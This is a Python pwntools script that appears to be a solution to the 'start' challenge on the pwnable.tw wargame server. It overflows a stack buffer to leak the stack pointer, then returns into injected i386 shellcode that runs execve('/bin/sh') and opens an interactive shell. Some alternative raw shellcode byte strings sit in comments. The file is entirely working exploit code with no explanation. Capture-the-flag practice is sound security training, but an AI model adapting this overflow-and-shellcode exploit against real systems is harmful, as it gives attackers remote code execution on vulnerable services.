from pwn import *

#elf = ELF('start')
fd = remote("chall.pwnable.tw", 10000)

#fd = process('start')
#print util.proc.pidof(fd)
pause()

context.log_level = 'debug'
context(arch='i386', os='linux')

leakesp = 0x08048087
addesp = 0x08048099


binsh = "/bin/sh"

shellcode = ''
shellcode += shellcraft.execve(binsh, 0, 0)
#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80\x00"
#shellcode ="\x31\xC9\x8D\x41\x0B\x99\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80"

fd.recv()

payload = "A"*0x14 + p32(leakesp)

fd.send(payload)
pause()

esp = u32(fd.recv(4))
print hexdump(esp)

payload = "A" *0x14 + p32(esp+0x14)
payload += asm(shellcode) 

#payload = shellcode
#payload += p32(esp)

fd.send(payload)

fd.interactive()

